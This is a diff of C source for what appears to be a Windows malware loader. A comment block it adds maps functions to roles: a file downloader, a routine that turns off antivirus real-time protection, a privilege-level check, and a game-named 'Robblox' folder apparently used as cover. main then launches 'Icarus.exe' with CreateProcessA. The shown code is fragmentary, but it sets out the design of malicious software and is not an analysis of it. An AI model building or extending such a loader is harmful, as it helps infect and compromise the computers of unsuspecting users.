@@ -9,6 +9,15 @@
 #include <openssl/err.h>
 
 
+/*
+Saint_Bear same as STRONTIUM
+Metador true/false for Saint_Bear\\Local\\Robblox folder
+main runs Icarus
+Rhea file downloder
+WhiteBear turns off real time protection
+FIN4 check the priv level
+*/
+
 int main(){
 
     char *ppp = Saint_Bear();
@@ -31,7 +40,7 @@ int main(){
 
     // Path to your executable
     char exePath[MAX_PATH];
-    snprintf(exePath, MAX_PATH, "%s\\icarus.exe", path);
+    snprintf(exePath, MAX_PATH, "%s\\Icarus.exe", path);
 
     // Start the process
     CreateProcessA(
